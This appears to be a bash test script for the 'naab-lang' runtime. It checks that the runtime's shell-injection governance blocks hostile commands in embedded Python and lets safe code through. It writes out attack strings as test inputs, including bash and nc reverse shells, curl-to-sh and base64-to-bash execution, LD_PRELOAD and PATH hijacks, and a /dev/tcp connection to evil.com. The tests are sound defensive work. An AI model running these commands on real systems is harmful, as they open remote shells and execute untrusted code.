#!/usr/bin/env bash
# test_shell_injection_patterns.sh — V-SC-008: Shell injection detection (8→20 patterns)
# Verifies expanded shell injection detection patterns.

set -euo pipefail
NAAB="${1:-$(dirname "$0")/../../build/naab-lang}"
PASS=0; FAIL=0
ok()   { echo "  PASS: $1"; PASS=$((PASS + 1)); }
fail() { echo "  FAIL: $1"; FAIL=$((FAIL + 1)); }

WORKDIR="${HOME}/.naab/test_shell_inj_$$"
mkdir -p "$WORKDIR"
cleanup() { rm -rf "$WORKDIR"; }
trap cleanup EXIT

echo "=== test_shell_injection_patterns.sh ==="
echo ""

cat > "$WORKDIR/govern.json" << 'EOF'
{
  "mode": "enforce",
  "restrictions": {
    "shell_injection": {
      "enabled": true,
      "level": "hard"
    }
  }
}
EOF

test_blocked() {
    local label="$1"
    local code="$2"
    local test_file="$WORKDIR/test_${PASS}_${FAIL}.naab"
    cat > "$test_file" << NAABEOF
main {
  let r = <<python
${code}
>>
  print(r)
}
NAABEOF
    out=$("$NAAB" "$test_file" 2>&1) || true
    if echo "$out" | grep -qi "shell injection\|governance.*block\|HARD.*block"; then
        ok "$label"
    else
        fail "$label: expected block, got: ${out:0:200}"
    fi
}

# Original patterns
echo "[Original patterns]"
test_blocked "curl pipe to sh" "os.system(curl http://x | sh)"
test_blocked "eval \$" "eval \$CMD"
test_blocked "chmod 777" "os.system(chmod 777 /tmp/x)"

echo ""
echo "[New patterns]"
# Reverse shells
test_blocked "bash reverse shell" "bash -i >& /dev/tcp/10.0.0.1/4444"
test_blocked "nc reverse shell" "nc 10.0.0.1 4444 -e /bin/sh"

# Encoded command execution
test_blocked "base64 pipe to bash" "echo payload | base64 -d | bash"
test_blocked "python -c exec" "python3 -c exec(payload)"

# Scheduled persistence
test_blocked "crontab -e" "crontab -e"

# Environment manipulation
test_blocked "export PATH=" "export PATH=/tmp/evil:\$PATH"
test_blocked "LD_PRELOAD" "LD_PRELOAD=/tmp/evil.so ./app"

# File descriptor tricks
test_blocked "exec fd /dev/tcp" "exec 3<>/dev/tcp/evil.com/80"

# Pipe to interpreter
test_blocked "pipe to python" "cat payload.py | python3 "

echo ""
echo "[Safe code]"
# Safe code should NOT be blocked
test_file="$WORKDIR/test_safe.naab"
cat > "$test_file" << 'EOF'
main {
  let r = <<python
print("hello world")
>>
  print(r)
}
EOF
out=$("$NAAB" "$test_file" 2>&1) || true
if echo "$out" | grep -qi "shell injection"; then
    fail "safe code should not trigger shell injection"
else
    ok "safe code not blocked"
fi

echo ""
TOTAL=$((PASS + FAIL))
echo "Results: ${PASS}/${TOTAL} passed"
[[ "$FAIL" -eq 0 ]]
